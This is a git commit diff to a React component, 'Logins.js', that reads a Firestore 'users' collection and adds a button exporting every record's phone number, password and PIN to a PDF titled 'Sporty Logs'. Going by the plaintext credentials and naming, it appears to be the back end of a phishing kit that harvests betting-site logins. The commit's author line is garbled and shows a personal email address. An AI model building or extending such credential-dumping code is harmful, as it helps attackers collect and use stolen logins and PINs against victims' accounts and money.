e4970e691999d60352831ec421778b7ab1fd629c
Dxtobi <akanbijosephtobi.comgit config --global user.email akanbijosephtobi@gmail.comgit config --global user.email akanbijosephtobi.com>
2022-01-22 04:17:46 -0600

    new updates

--- src/Logins.js
+++ src/Logins.js
@@ -1,12 +1,13 @@
 import {useState, useEffect} from 'react'
 import {db} from './firebase-config'
-import { collection, getDocs } from "firebase/firestore";
-
+import { collection, getDocs, collectionGroup } from "firebase/firestore";
+import jsPDF from "jspdf";
+import "jspdf-autotable";
 
 function Table() {
     const [users, setUsers] = useState([])
     const usersRef = collection(db, "users",)
-
+    
   useEffect(() => {
           const created = new Date(Date.now());
           const getUsers = async () => {
@@ -21,8 +22,36 @@ function Table() {
 
         getUsers()
     }, [])
+
+    const exportPDF = () => {
+      const unit = "pt";
+      const size = "A3"; // Use A1, A2, A3 or A4
+      const orientation = "portrait"; // portrait or landscape
+  
+      const marginLeft = 20;
+      const doc = new jsPDF(orientation, unit, size);
+  
+      doc.setFontSize(11);
+  
+      const title = "Sporty Logs";
+      const headers = [["SN", "PHONE", "PASSWORD", "PIN", ]];
+  
+      const data = users.map((elt, i)=> [i, elt.phone, elt.pass, elt.pin]);
+  
+      let content = {
+        startY: 50,
+        head: headers,
+        body: data
+      };
+  
+      doc.text(title, marginLeft, 40);
+      doc.autoTable(content);
+      const nameDoc= `${Date.now()}Sporty.pdf`
+      doc.save(nameDoc)
+    }
   return (
     <div className="table_list">
+      <button onClick={exportPDF} className="export_btn">Download As PDF</button>
       <table>
         <thead>
           <tr>
